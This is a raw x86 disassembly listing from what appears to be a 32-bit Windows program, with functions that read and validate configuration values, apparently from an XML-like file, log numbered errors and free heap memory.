  405530:	mov    ebx,eax
  405532:	test   ebx,ebx
  405534:	jne    0x4059d5
  40553a:	lea    eax,[ebp-0x4]
  40553d:	mov    edx,0x4013a8
  405542:	push   eax
  405543:	mov    ecx,esi
  405545:	call   0x403fdc
  40554a:	mov    esi,eax
  40554c:	mov    DWORD PTR [ebp-0x10],esi
  40554f:	test   esi,esi
  405551:	je     0x4059b8
  405557:	mov    edx,DWORD PTR [ebp-0x4]
  40555a:	lea    eax,[ebp-0x8]
  40555d:	push   eax
  40555e:	push   0xffffffff
  405560:	mov    ecx,esi
  405562:	call   0x4043d3
  405567:	test   al,al
  405569:	je     0x405988
  40556f:	mov    eax,DWORD PTR [ebp-0x8]
  405572:	test   eax,eax
  405574:	js     0x405988
  40557a:	mov    esi,DWORD PTR [ebp-0xc]
  40557d:	mov    edx,0x401350
  405582:	mov    ecx,esi
  405584:	mov    DWORD PTR [edi+0x20],eax
  405587:	call   0x404385
  40558c:	mov    DWORD PTR [ebp-0x10],eax
  40558f:	mov    edx,0x401344
  405594:	lea    eax,[ebp-0x4]
  405597:	mov    ecx,esi
  405599:	push   eax
  40559a:	call   0x403fdc
  40559f:	test   eax,eax
  4055a1:	je     0x4055d2
  4055a3:	push   DWORD PTR [ebp-0x10]
  4055a6:	mov    edx,DWORD PTR [ebp-0x4]
  4055a9:	xor    ecx,ecx
  4055ab:	push   0x1
  4055ad:	push   ecx
  4055ae:	push   ecx
  4055af:	mov    ecx,eax
  4055b1:	call   0x404c6d
  4055b6:	test   eax,eax
  4055b8:	je     0x4055c5
  4055ba:	mov    ecx,DWORD PTR [eax+0x10]
  4055bd:	mov    DWORD PTR [edi+0x28],ecx
  4055c0:	mov    DWORD PTR [edi+0x24],eax
  4055c3:	jmp    0x4055d6
  4055c5:	call   DWORD PTR ds:0x409010
  4055cb:	mov    ebx,eax
  4055cd:	jmp    0x4059d1
  4055d2:	or     DWORD PTR [edi+0x28],0xffffffff
  4055d6:	mov    edx,0x401378
  4055db:	mov    ecx,esi
  4055dd:	call   0x404385
  4055e2:	mov    DWORD PTR [ebp-0x10],eax
  4055e5:	mov    edx,0x401360
  4055ea:	lea    eax,[ebp-0x4]
  4055ed:	mov    ecx,esi
  4055ef:	push   eax
  4055f0:	call   0x403fdc
  4055f5:	test   eax,eax
  4055f7:	je     0x405618
  4055f9:	push   DWORD PTR [ebp-0x10]
  4055fc:	mov    edx,DWORD PTR [ebp-0x4]
  4055ff:	xor    ecx,ecx
  405601:	push   0x2
  405603:	push   ecx
  405604:	push   ecx
  405605:	mov    ecx,eax
  405607:	call   0x404c6d
  40560c:	test   eax,eax
  40560e:	je     0x4055c5
  405610:	mov    eax,DWORD PTR [eax+0x10]
  405613:	mov    DWORD PTR [edi+0x2c],eax
  405616:	jmp    0x40561c
  405618:	or     DWORD PTR [edi+0x2c],0xffffffff
  40561c:	xor    eax,eax
  40561e:	mov    edx,0x4013b0
  405623:	mov    DWORD PTR [edi+0x8],eax
  405626:	mov    ecx,esi
  405628:	lea    eax,[ebp-0x4]
  40562b:	push   eax
  40562c:	call   0x403fdc
  405631:	mov    DWORD PTR [ebp-0x8],eax
  405634:	test   eax,eax
  405636:	je     0x40564f
  405638:	mov    edx,DWORD PTR [ebp-0x4]
  40563b:	mov    ecx,eax
  40563d:	push   0x26
  40563f:	push   0x402a40
  405644:	call   0x404329
  405649:	mov    DWORD PTR [edi+0x8],eax
  40564c:	mov    eax,DWORD PTR [ebp-0x8]
  40564f:	xor    ecx,ecx
  405651:	cmp    DWORD PTR [edi+0x8],ecx
  405654:	jne    0x40569b
  405656:	push   0x4011b8
  40565b:	push   0x4013b0
  405660:	test   eax,eax
  405662:	jne    0x405672
  405664:	push   0x2
  405666:	push   0x6c
  405668:	call   0x4068f5
  40566d:	add    esp,0x10
  405670:	jmp    0x405693
  405672:	mov    ebx,DWORD PTR [ebp-0x4]
  405675:	xor    ecx,ecx
  405677:	push   eax
  405678:	push   0x2
  40567a:	push   0x6d
  40567c:	movzx  esi,WORD PTR [eax+ebx*2]
  405680:	mov    WORD PTR [eax+ebx*2],cx
  405684:	call   0x4068f5
  405689:	mov    eax,DWORD PTR [ebp-0x8]
  40568c:	mov    WORD PTR [eax+ebx*2],si
  405690:	add    esp,0x14
  405693:	push   0xd
  405695:	pop    ebx
  405696:	jmp    0x4059d5
  40569b:	lea    eax,[ebp-0x4]
  40569e:	mov    DWORD PTR [edi+0xc],ecx
  4056a1:	push   eax
  4056a2:	mov    edx,0x4013e8
  4056a7:	mov    ecx,esi
  4056a9:	call   0x403fdc
  4056ae:	mov    DWORD PTR [ebp-0x8],eax
  4056b1:	test   eax,eax
  4056b3:	je     0x4056cc
  4056b5:	mov    edx,DWORD PTR [ebp-0x4]
  4056b8:	mov    ecx,eax
  4056ba:	push   0x2
  4056bc:	push   0x402a00
  4056c1:	call   0x404329
  4056c6:	mov    DWORD PTR [edi+0xc],eax
  4056c9:	mov    eax,DWORD PTR [ebp-0x8]
  4056cc:	xor    ecx,ecx
  4056ce:	cmp    DWORD PTR [edi+0xc],ecx
  4056d1:	jne    0x405717
  4056d3:	test   eax,eax
  4056d5:	je     0x405710
  4056d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4056da:	xor    edx,edx
  4056dc:	movzx  esi,WORD PTR [eax+ecx*2]
  4056e0:	mov    WORD PTR [eax+ecx*2],dx
  4056e4:	push   DWORD PTR ds:0x402a00
  4056ea:	push   0x4011b8
  4056ef:	push   0x4013e8
  4056f4:	push   eax
  4056f5:	push   0x1
  4056f7:	push   0x6f
  4056f9:	call   0x4068f5
  4056fe:	mov    ecx,DWORD PTR [ebp-0x4]
  405701:	add    esp,0x18
  405704:	mov    eax,DWORD PTR [ebp-0x8]
  405707:	mov    WORD PTR [eax+ecx*2],si
  40570b:	xor    ecx,ecx
  40570d:	mov    esi,DWORD PTR [ebp-0xc]
  405710:	mov    DWORD PTR [edi+0xc],0x402a00
  405717:	lea    eax,[ebp-0x4]
  40571a:	mov    DWORD PTR [ebp-0x8],ecx
  40571d:	push   eax
  40571e:	mov    edx,0x4013cc
  405723:	mov    ecx,esi
  405725:	call   0x403fdc
  40572a:	mov    DWORD PTR [ebp-0x10],eax
  40572d:	test   eax,eax
  40572f:	je     0x405781
  405731:	mov    edx,DWORD PTR [ebp-0x4]
  405734:	lea    ecx,[ebp-0x8]
  405737:	push   ecx
  405738:	xor    ecx,ecx
  40573a:	push   ecx
  40573b:	mov    ecx,eax
  40573d:	call   0x4043d3
  405742:	test   al,al
  405744:	jne    0x405781
  405746:	mov    eax,DWORD PTR [ebp-0x10]
  405749:	xor    edx,edx
  40574b:	mov    ecx,DWORD PTR [ebp-0x4]
  40574e:	push   eax
  40574f:	push   0x4011b8
  405754:	push   0x4013cc
  405759:	movzx  esi,WORD PTR [eax+ecx*2]
  40575d:	push   0x1
  40575f:	push   0x71
  405761:	mov    WORD PTR [eax+ecx*2],dx
  405765:	call   0x4068f5
  40576a:	mov    eax,DWORD PTR [ebp-0x10]
  40576d:	add    esp,0x14
  405770:	mov    ecx,DWORD PTR [ebp-0x4]
  405773:	mov    WORD PTR [eax+ecx*2],si
  405777:	xor    eax,eax
  405779:	mov    esi,DWORD PTR [ebp-0xc]
  40577c:	mov    DWORD PTR [ebp-0x8],eax
  40577f:	jmp    0x405784
  405781:	mov    eax,DWORD PTR [ebp-0x8]
  405784:	mov    DWORD PTR [edi+0x30],eax
  405787:	mov    edx,0x4013bc
  40578c:	lea    eax,[ebp-0x4]
  40578f:	mov    ecx,esi
  405791:	push   eax
  405792:	call   0x403fdc
  405797:	or     esi,0xffffffff
  40579a:	mov    DWORD PTR [ebp-0x10],eax
  40579d:	test   eax,eax
  40579f:	je     0x4057eb
  4057a1:	mov    edx,DWORD PTR [ebp-0x4]
  4057a4:	lea    ecx,[ebp-0x8]
  4057a7:	push   ecx
  4057a8:	push   esi
  4057a9:	mov    ecx,eax
  4057ab:	call   0x4043d3
  4057b0:	test   al,al
  4057b2:	je     0x4057bb
  4057b4:	mov    eax,DWORD PTR [ebp-0x8]
  4057b7:	test   eax,eax
  4057b9:	jns    0x4057f0
  4057bb:	mov    ebx,DWORD PTR [ebp-0x10]
  4057be:	push   ebx
  4057bf:	push   0x4011b8
  4057c4:	push   0x4013bc
  4057c9:	mov    eax,DWORD PTR [ebp-0x4]
  4057cc:	xor    ecx,ecx
  4057ce:	push   0x2
  4057d0:	push   0x71
  4057d2:	movzx  esi,WORD PTR [ebx+eax*2]
  4057d6:	mov    WORD PTR [ebx+eax*2],cx
  4057da:	call   0x4068f5
  4057df:	mov    ecx,DWORD PTR [ebp-0x4]
  4057e2:	mov    WORD PTR [ebx+ecx*2],si
  4057e6:	jmp    0x405690
  4057eb:	mov    eax,esi
  4057ed:	mov    DWORD PTR [ebp-0x8],eax
  4057f0:	mov    ecx,DWORD PTR [ebp-0xc]
  4057f3:	mov    edx,0x401414
  4057f8:	mov    DWORD PTR [edi+0x34],eax
  4057fb:	lea    eax,[ebp-0x4]
  4057fe:	push   eax
  4057ff:	call   0x403fdc
  405804:	mov    DWORD PTR [ebp-0x10],eax
  405807:	test   eax,eax
  405809:	je     0x405835
  40580b:	mov    edx,DWORD PTR [ebp-0x4]
  40580e:	lea    ecx,[ebp-0x8]
  405811:	push   ecx
  405812:	push   esi
  405813:	mov    ecx,eax
  405815:	call   0x4043d3
  40581a:	test   al,al
  40581c:	je     0x405825
  40581e:	mov    eax,DWORD PTR [ebp-0x8]
  405821:	test   eax,eax
  405823:	jns    0x40583a
  405825:	mov    ebx,DWORD PTR [ebp-0x10]
  405828:	push   ebx
  405829:	push   0x4011b8
  40582e:	push   0x401414
  405833:	jmp    0x4057c9
  405835:	mov    eax,esi
  405837:	mov    DWORD PTR [ebp-0x8],eax
  40583a:	mov    ecx,DWORD PTR [ebp-0xc]
  40583d:	mov    edx,0x401444
  405842:	mov    DWORD PTR [edi+0x38],eax
  405845:	lea    eax,[ebp-0x4]
  405848:	push   eax
  405849:	call   0x403fdc
  40584e:	mov    DWORD PTR [ebp-0x10],eax
  405851:	test   eax,eax
  405853:	je     0x405882
  405855:	mov    edx,DWORD PTR [ebp-0x4]
  405858:	lea    ecx,[ebp-0x8]
  40585b:	push   ecx
  40585c:	push   esi
  40585d:	mov    ecx,eax
  40585f:	call   0x4043d3
  405864:	test   al,al
  405866:	je     0x40586f
  405868:	mov    eax,DWORD PTR [ebp-0x8]
  40586b:	test   eax,eax
  40586d:	jns    0x405887
  40586f:	mov    ebx,DWORD PTR [ebp-0x10]
  405872:	push   ebx
  405873:	push   0x4011b8
  405878:	push   0x401444
  40587d:	jmp    0x4057c9
  405882:	mov    eax,esi
  405884:	mov    DWORD PTR [ebp-0x8],eax
  405887:	mov    ecx,DWORD PTR [ebp-0xc]
  40588a:	mov    edx,0x40142c
  40588f:	mov    DWORD PTR [edi+0x40],eax
  405892:	lea    eax,[ebp-0x4]
  405895:	push   eax
  405896:	call   0x403fdc
  40589b:	mov    DWORD PTR [ebp-0x10],eax
  40589e:	test   eax,eax
  4058a0:	je     0x4058cf
  4058a2:	mov    edx,DWORD PTR [ebp-0x4]
  4058a5:	lea    ecx,[ebp-0x8]
  4058a8:	push   ecx
  4058a9:	push   esi
  4058aa:	mov    ecx,eax
  4058ac:	call   0x4043d3
  4058b1:	test   al,al
  4058b3:	je     0x4058bc
  4058b5:	mov    esi,DWORD PTR [ebp-0x8]
  4058b8:	test   esi,esi
  4058ba:	jns    0x4058cf
  4058bc:	mov    ebx,DWORD PTR [ebp-0x10]
  4058bf:	push   ebx
  4058c0:	push   0x4011b8
  4058c5:	push   0x40142c
  4058ca:	jmp    0x4057c9
  4058cf:	mov    DWORD PTR [edi+0x3c],esi
  4058d2:	mov    esi,DWORD PTR [ebp+0x8]
  4058d5:	mov    eax,DWORD PTR [esi+0x1c]
  4058d8:	cmp    DWORD PTR [eax+0x8],0x0
  4058dc:	je     0x405967
  4058e2:	cmp    DWORD PTR [eax+0x8],0x2
  4058e6:	je     0x405967
  4058e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4058eb:	xor    eax,eax
  4058ed:	mov    DWORD PTR [edi+0x10],eax
  4058f0:	mov    edx,0x401400
  4058f5:	lea    eax,[ebp-0x4]
  4058f8:	push   eax
  4058f9:	call   0x403fdc
  4058fe:	mov    DWORD PTR [ebp-0x10],eax
  405901:	test   eax,eax
  405903:	je     0x40591c
  405905:	mov    edx,DWORD PTR [ebp-0x4]
  405908:	mov    ecx,eax
  40590a:	push   0x5
  40590c:	push   0x4029b0
  405911:	call   0x404329
  405916:	mov    DWORD PTR [edi+0x10],eax
  405919:	mov    eax,DWORD PTR [ebp-0x10]
  40591c:	xor    ecx,ecx
  40591e:	cmp    DWORD PTR [edi+0x10],ecx
  405921:	jne    0x40596e
  405923:	test   eax,eax
  405925:	je     0x40595e
  405927:	mov    ecx,DWORD PTR [ebp-0x4]
  40592a:	xor    edx,edx
  40592c:	movzx  esi,WORD PTR [eax+ecx*2]
  405930:	mov    WORD PTR [eax+ecx*2],dx
  405934:	push   DWORD PTR ds:0x4029b0
  40593a:	push   0x4011b8
  40593f:	push   0x401400
  405944:	push   eax
  405945:	push   0x1
  405947:	push   0x6f
  405949:	call   0x4068f5
  40594e:	mov    eax,DWORD PTR [ebp-0x10]
  405951:	add    esp,0x18
  405954:	mov    ecx,DWORD PTR [ebp-0x4]
  405957:	mov    WORD PTR [eax+ecx*2],si
  40595b:	mov    esi,DWORD PTR [ebp+0x8]
  40595e:	mov    DWORD PTR [edi+0x10],0x4029b0
  405965:	jmp    0x40596e
  405967:	mov    DWORD PTR [edi+0x10],0x4029f0
  40596e:	xor    ecx,ecx
  405970:	mov    DWORD PTR [edi],ecx
  405972:	mov    eax,DWORD PTR [esi+0x4]
  405975:	test   eax,eax
  405977:	jne    0x405980
  405979:	mov    DWORD PTR [esi+0x4],edi
  40597c:	jmp    0x4059d1
  40597e:	mov    eax,DWORD PTR [eax]
  405980:	cmp    DWORD PTR [eax],ecx
  405982:	jne    0x40597e
  405984:	mov    DWORD PTR [eax],edi
  405986:	jmp    0x4059d1
  405988:	mov    ebx,DWORD PTR [ebp-0x10]
  40598b:	xor    ecx,ecx
  40598d:	mov    eax,DWORD PTR [ebp-0x4]
  405990:	push   ebx
  405991:	push   0x4011b8
  405996:	push   0x4013a8
  40599b:	movzx  esi,WORD PTR [esi+eax*2]
  40599f:	push   0x2
  4059a1:	push   0x71
  4059a3:	mov    WORD PTR [ebx+eax*2],cx
  4059a7:	call   0x4068f5
  4059ac:	mov    eax,DWORD PTR [ebp-0x4]
  4059af:	mov    WORD PTR [ebx+eax*2],si
  4059b3:	jmp    0x405690
  4059b8:	push   0x4011b8
  4059bd:	push   0x4013a8
  4059c2:	push   0x2
  4059c4:	push   0x6c
  4059c6:	call   0x4068f5
  4059cb:	add    esp,0x10
  4059ce:	push   0xd
  4059d0:	pop    ebx
  4059d1:	test   ebx,ebx
  4059d3:	je     0x405a33
  4059d5:	xor    esi,esi
  4059d7:	cmp    DWORD PTR [edi+0x44],esi
  4059da:	je     0x4059ed
  4059dc:	push   DWORD PTR [edi+0x44]
  4059df:	push   esi
  4059e0:	call   DWORD PTR ds:0x409050
  4059e6:	push   eax
  4059e7:	call   DWORD PTR ds:0x409054
  4059ed:	cmp    DWORD PTR [edi+0x48],0x0
  4059f1:	je     0x405a04
  4059f3:	push   DWORD PTR [edi+0x48]
  4059f6:	push   esi
  4059f7:	call   DWORD PTR ds:0x409050
  4059fd:	push   eax
  4059fe:	call   DWORD PTR ds:0x409054
  405a04:	cmp    DWORD PTR [edi+0x4c],0x0
  405a08:	je     0x405a1b
  405a0a:	push   DWORD PTR [edi+0x4c]
  405a0d:	push   esi
  405a0e:	call   DWORD PTR ds:0x409050
  405a14:	push   eax
  405a15:	call   DWORD PTR ds:0x409054
  405a1b:	push   edi
  405a1c:	push   esi
  405a1d:	call   DWORD PTR ds:0x409050
  405a23:	push   eax
  405a24:	call   DWORD PTR ds:0x409054
  405a2a:	mov    edi,esi
  405a2c:	push   ebx
  405a2d:	call   DWORD PTR ds:0x409014
  405a33:	mov    eax,edi
  405a35:	pop    edi
  405a36:	pop    esi
  405a37:	pop    ebx
  405a38:	mov    esp,ebp
  405a3a:	pop    ebp
  405a3b:	ret    0x4
  405a3e:	int3   
  405a3f:	int3   
  405a40:	int3   
  405a41:	int3   
  405a42:	int3   
  405a43:	mov    edi,edi
  405a45:	push   ebp
  405a46:	mov    ebp,esp
  405a48:	sub    esp,0x30
  405a4b:	mov    eax,ds:0x408004
  405a50:	xor    eax,ebp
  405a52:	mov    DWORD PTR [ebp-0x4],eax
  405a55:	lea    eax,[ebp-0x30]
  405a58:	mov    edx,0x401268
  405a5d:	push   eax
  405a5e:	call   0x403fdc
  405a63:	mov    ecx,eax
  405a65:	test   ecx,ecx
  405a67:	jne    0x405a7f
  405a69:	fldz   
  405a6b:	fstp   QWORD PTR ds:0x4083c0
  405a71:	mov    ecx,DWORD PTR [ebp-0x4]
  405a74:	xor    ecx,ebp
  405a76:	call   0x407090
  405a7b:	mov    esp,ebp
  405a7d:	pop    ebp
  405a7e:	ret    
  405a7f:	mov    eax,DWORD PTR [ebp-0x30]
  405a82:	cmp    eax,0x14
  405a85:	jb     0x405a8c
  405a87:	push   0x7a
  405a89:	pop    eax
  405a8a:	jmp    0x405a71
  405a8c:	push   esi
  405a8d:	lea    esi,[eax+eax*1]
  405a90:	push   esi
  405a91:	push   ecx
  405a92:	lea    eax,[ebp-0x2c]
  405a95:	push   eax
  405a96:	call   0x40775c
  405a9b:	add    esp,0xc
  405a9e:	cmp    esi,0x28
  405aa1:	jae    0x405ac0
  405aa3:	xor    eax,eax
  405aa5:	mov    WORD PTR [ebp+esi*1-0x2c],ax
  405aaa:	lea    eax,[ebp-0x2c]
  405aad:	push   eax
  405aae:	call   DWORD PTR ds:0x40917c
  405ab4:	pop    ecx
  405ab5:	fstp   QWORD PTR ds:0x4083c0
  405abb:	xor    eax,eax
  405abd:	pop    esi
  405abe:	jmp    0x405a71
  405ac0:	call   0x4075ea
  405ac5:	int3   
  405ac6:	int3   
  405ac7:	int3   
  405ac8:	int3   
  405ac9:	int3   
  405aca:	int3   
  405acb:	mov    edi,edi
  405acd:	push   ebp
  405ace:	mov    ebp,esp
  405ad0:	sub    esp,0x24
  405ad3:	push   ebx
  405ad4:	push   esi
  405ad5:	push   edi
  405ad6:	mov    edi,ecx
  405ad8:	call   0x405a43
  405add:	mov    ebx,eax
  405adf:	test   ebx,ebx
  405ae1:	jne    0x405d80
  405ae7:	fld    QWORD PTR ds:0x4083c0
  405aed:	push   ecx
  405aee:	push   ecx
  405aef:	fstp   QWORD PTR [esp]
  405af2:	call   0x407750
  405af7:	fcomp  QWORD PTR ds:0x402e58
  405afd:	fnstsw ax
  405aff:	pop    ecx
  405b00:	pop    ecx
  405b01:	test   ah,0x41
  405b04:	jne    0x405b10
  405b06:	mov    ebx,0x47e
  405b0b:	jmp    0x405d80
  405b10:	mov    ecx,edi
  405b12:	xor    esi,esi
  405b14:	call   0x404261
  405b19:	test   al,al
  405b1b:	je     0x405d75
  405b21:	jmp    0x405d54
  405b26:	mov    ecx,edi
  405b28:	call   0x404d9f
  405b2d:	mov    DWORD PTR [ebp-0x14],eax
  405b30:	test   eax,eax
  405b32:	je     0x405d89
  405b38:	cmp    BYTE PTR ds:0x4083bc,0x0
  405b3f:	je     0x405b4d
  405b41:	mov    ecx,DWORD PTR ds:0x408048
  405b47:	mov    DWORD PTR ds:0x40804c,ecx
  405b4d:	and    DWORD PTR [ebp-0x8],0x0
  405b51:	inc    esi
  405b52:	mov    ecx,edi
  405b54:	mov    DWORD PTR [ebp-0x10],esi
  405b57:	call   0x404261
  405b5c:	test   al,al
  405b5e:	je     0x405d3e
  405b64:	push   ecx
  405b65:	push   ecx
  405b66:	mov    edx,0x4011a0
  405b6b:	mov    ecx,edi
  405b6d:	call   0x404202
  405b72:	test   al,al
  405b74:	je     0x405d31
  405b7a:	mov    edx,DWORD PTR [ebp-0x14]
  405b7d:	mov    ecx,edi
  405b7f:	call   0x405088
  405b84:	mov    DWORD PTR [ebp-0x18],eax
  405b87:	test   eax,eax
  405b89:	je     0x405d89
  405b8f:	inc    DWORD PTR [ebp-0x8]
  405b92:	mov    ecx,edi
  405b94:	xor    esi,esi
  405b96:	call   0x404261
  405b9b:	test   al,al
  405b9d:	je     0x405d02
  405ba3:	jmp    0x405ce1
  405ba8:	push   DWORD PTR [ebp-0x18]
  405bab:	mov    ecx,edi
  405bad:	call   0x40540f
  405bb2:	mov    DWORD PTR [ebp-0x1c],eax
  405bb5:	test   eax,eax
  405bb7:	je     0x405d89
  405bbd:	inc    esi
  405bbe:	mov    ecx,edi
  405bc0:	mov    DWORD PTR [ebp-0x24],esi
  405bc3:	call   0x404261
  405bc8:	test   al,al
  405bca:	je     0x405cd6
  405bd0:	push   ecx
  405bd1:	push   ecx
  405bd2:	mov    edx,0x4011c8
  405bd7:	mov    ecx,edi
  405bd9:	call   0x404202
  405bde:	test   al,al
  405be0:	je     0x405ccf
  405be6:	mov    ecx,edi
  405be8:	call   0x404261
  405bed:	test   al,al
  405bef:	je     0x405ccc
  405bf5:	push   ecx
  405bf6:	push   ecx
  405bf7:	mov    edx,0x4011ec
  405bfc:	mov    ecx,edi
  405bfe:	call   0x404202
  405c03:	test   al,al
  405c05:	je     0x405ca6
  405c0b:	xor    ebx,ebx
  405c0d:	mov    DWORD PTR [ebp-0x20],ebx
  405c10:	mov    ebx,DWORD PTR [ebp-0x1c]
  405c13:	lea    eax,[ebp-0x4]
  405c16:	mov    edx,0x401344
  405c1b:	push   eax
  405c1c:	mov    ecx,edi
  405c1e:	call   0x403fdc
  405c23:	mov    esi,eax
  405c25:	mov    DWORD PTR [ebp-0xc],esi
  405c28:	test   esi,esi
  405c2a:	je     0x405c82
  405c2c:	mov    edx,DWORD PTR [ebp-0x4]
  405c2f:	mov    ecx,esi
  405c31:	push   0x5
  405c33:	push   0x402d00
  405c38:	call   0x404329
  405c3d:	mov    ecx,eax
  405c3f:	test   ecx,ecx
  405c41:	jne    0x405c76
  405c43:	mov    ecx,DWORD PTR [ebp-0x4]
  405c46:	xor    edx,edx
  405c48:	mov    eax,DWORD PTR [ebp-0xc]
  405c4b:	push   0x4011ec
  405c50:	push   0x401344
  405c55:	movzx  esi,WORD PTR [esi+ecx*2]
  405c59:	push   eax
  405c5a:	push   0x1
  405c5c:	push   0x70
  405c5e:	mov    WORD PTR [eax+ecx*2],dx
  405c62:	call   0x4068f5
  405c67:	mov    eax,DWORD PTR [ebp-0xc]
  405c6a:	add    esp,0x14
  405c6d:	mov    ecx,DWORD PTR [ebp-0x4]
  405c70:	mov    WORD PTR [eax+ecx*2],si
  405c74:	jmp    0x405c82
  405c76:	mov    eax,DWORD PTR [ecx+0x8]
  405c79:	or     DWORD PTR [ebx+0x18],eax
  405c7c:	mov    eax,DWORD PTR [ecx+0xc]
  405c7f:	or     DWORD PTR [ebx+0x1c],eax
  405c82:	mov    ecx,edi
  405c84:	call   0x404155
  405c89:	test   al,al
  405c8b:	je     0x405ca3
  405c8d:	push   ecx
  405c8e:	push   ecx
  405c8f:	mov    edx,0x4011ec
  405c94:	mov    ecx,edi
  405c96:	call   0x404202
  405c9b:	test   al,al
  405c9d:	jne    0x405c13
  405ca3:	mov    ebx,DWORD PTR [ebp-0x20]
  405ca6:	mov    ecx,edi
  405ca8:	call   0x404312
  405cad:	call   0x404155
  405cb2:	test   al,al
  405cb4:	je     0x405ccc
  405cb6:	push   ecx
  405cb7:	push   ecx
  405cb8:	mov    edx,0x4011c8
  405cbd:	mov    ecx,edi
  405cbf:	call   0x404202
  405cc4:	test   al,al
  405cc6:	jne    0x405be6
  405ccc:	mov    esi,DWORD PTR [ebp-0x24]
  405ccf:	mov    ecx,edi
  405cd1:	call   0x404312
  405cd6:	mov    ecx,edi
  405cd8:	call   0x404155
  405cdd:	test   al,al
  405cdf:	je     0x405cf7
  405ce1:	push   ecx
  405ce2:	push   ecx
  405ce3:	mov    edx,0x4011b8
  405ce8:	mov    ecx,edi
  405cea:	call   0x404202
  405cef:	test   al,al
  405cf1:	jne    0x405ba8
  405cf7:	mov    ecx,edi
  405cf9:	call   0x404312
  405cfe:	test   esi,esi
  405d00:	jne    0x405d0d
  405d02:	push   0x1
  405d04:	push   0x7b
  405d06:	call   0x4068f5
  405d0b:	pop    ecx
  405d0c:	pop    ecx
  405d0d:	mov    ecx,edi
  405d0f:	call   0x404155
  405d14:	test   al,al
  405d16:	je     0x405d2e
  405d18:	push   ecx
  405d19:	push   ecx
  405d1a:	mov    edx,0x4011a0
  405d1f:	mov    ecx,edi
  405d21:	call   0x404202
  405d26:	test   al,al
  405d28:	jne    0x405b7a
  405d2e:	mov    esi,DWORD PTR [ebp-0x10]
  405d31:	mov    ecx,edi
  405d33:	call   0x404312
  405d38:	cmp    DWORD PTR [ebp-0x8],0x0
  405d3c:	jne    0x405d49
  405d3e:	push   0x1
  405d40:	push   0x7a
  405d42:	call   0x4068f5
  405d47:	pop    ecx
  405d48:	pop    ecx
  405d49:	mov    ecx,edi
  405d4b:	call   0x404155
  405d50:	test   al,al
  405d52:	je     0x405d6a
  405d54:	push   ecx
  405d55:	push   ecx
  405d56:	mov    edx,0x40118c
  405d5b:	mov    ecx,edi
  405d5d:	call   0x404202
  405d62:	test   al,al
  405d64:	jne    0x405b26
  405d6a:	mov    ecx,edi
  405d6c:	call   0x404312
  405d71:	test   esi,esi
  405d73:	jne    0x405d80
  405d75:	push   0x1
  405d77:	push   0x79
  405d79:	call   0x4068f5
  405d7e:	pop    ecx
  405d7f:	pop    ecx
  405d80:	pop    edi
  405d81:	pop    esi
  405d82:	mov    eax,ebx
  405d84:	pop    ebx
  405d85:	mov    esp,ebp
  405d87:	pop    ebp
  405d88:	ret    
  405d89:	call   DWORD PTR ds:0x409010
  405d8f:	mov    ebx,eax
  405d91:	jmp    0x405d80
  405d93:	int3   
  405d94:	int3   
  405d95:	int3   
  405d96:	int3   
  405d97:	int3   
  405d98:	mov    edi,edi
  405d9a:	push   ebp
  405d9b:	mov    ebp,esp
  405d9d:	sub    esp,0xc
  405da0:	push   ebx
  405da1:	push   esi
  405da2:	push   edi
  405da3:	mov    edi,ecx
  405da5:	test   edi,edi
  405da7:	jne    0x405dbc
  405da9:	push   0x2
  405dab:	push   0x65
  405dad:	call   0x4068f5
  405db2:	pop    ecx
  405db3:	pop    ecx
  405db4:	push   0x57
  405db6:	pop    edi
  405db7:	jmp    0x4060a8
  405dbc:	push   0x60c
  405dc1:	push   0x8
  405dc3:	call   DWORD PTR ds:0x409050
  405dc9:	push   eax
  405dca:	call   DWORD PTR ds:0x409048
  405dd0:	mov    esi,eax
  405dd2:	test   esi,esi
  405dd4:	jne    0x405deb
  405dd6:	push   0xa56
  405ddb:	push   0x2
  405ddd:	push   0x66
  405ddf:	call   0x4068f5
  405de4:	add    esp,0xc
  405de7:	push   0xe
  405de9:	jmp    0x405db6
  405deb:	mov    edx,edi
  405ded:	mov    ecx,esi
  405def:	call   0x403d3c
  405df4:	mov    edi,eax
  405df6:	test   edi,edi
  405df8:	jne    0x40608d
  405dfe:	mov    ecx,esi
  405e00:	call   0x404261
  405e05:	test   al,al
  405e07:	jne    0x405e1c
  405e09:	push   0x2
  405e0b:	push   0x67
  405e0d:	call   0x4068f5
  405e12:	pop    ecx
  405e13:	pop    ecx
  405e14:	push   0xd
  405e16:	pop    edi
  405e17:	jmp    0x40608d
  405e1c:	push   ecx
  405e1d:	push   ecx
  405e1e:	xor    ebx,ebx
  405e20:	xor    edx,edx
  405e22:	mov    ecx,esi
  405e24:	mov    DWORD PTR [ebp-0xc],ebx
  405e27:	call   0x404202
  405e2c:	test   al,al
  405e2e:	je     0x40607b
  405e34:	lea    edx,[ebp-0x4]
  405e37:	mov    ecx,esi
  405e39:	call   0x403f7b
  405e3e:	mov    DWORD PTR [ebp-0x8],eax
  405e41:	test   eax,eax
  405e43:	je     0x40604b
  405e49:	push   0x401114
  405e4e:	call   DWORD PTR ds:0x4090e4
  405e54:	mov    ebx,DWORD PTR [ebp-0x4]
  405e57:	cmp    ebx,eax
  405e59:	jb     0x40604b
  405e5f:	push   ebx
  405e60:	push   0x401114
  405e65:	push   DWORD PTR [ebp-0x8]
  405e68:	call   DWORD PTR ds:0x409170
  405e6e:	add    esp,0xc
  405e71:	test   eax,eax
  405e73:	je     0x405e8f
  405e75:	push   ebx
  405e76:	push   0x401128
  405e7b:	push   DWORD PTR [ebp-0x8]
  405e7e:	call   DWORD PTR ds:0x409170
  405e84:	add    esp,0xc
  405e87:	test   eax,eax
  405e89:	jne    0x40604b
  405e8f:	mov    eax,DWORD PTR [ebp-0x8]
  405e92:	movzx  eax,WORD PTR [eax+ebx*2]
  405e96:	cmp    eax,0x20
  405e99:	je     0x405eb6
  405e9b:	push   0xd
  405e9d:	pop    ecx
  405e9e:	cmp    ax,cx
  405ea1:	je     0x405eb6
  405ea3:	cmp    eax,0x9
  405ea6:	je     0x405eb6
  405ea8:	cmp    eax,0xa
  405eab:	je     0x405eb6
  405ead:	cmp    eax,0x3e
  405eb0:	jne    0x40604b
  405eb6:	mov    ecx,esi
  405eb8:	call   0x404261
  405ebd:	test   al,al
  405ebf:	je     0x40604b
  405ec5:	jmp    0x406031
  405eca:	lea    edx,[ebp-0x4]
  405ecd:	mov    ecx,esi
  405ecf:	call   0x403f7b
  405ed4:	mov    ebx,eax
  405ed6:	test   ebx,ebx
  405ed8:	je     0x406026
  405ede:	push   DWORD PTR [ebp-0x4]
  405ee1:	push   0x401158
  405ee6:	push   ebx
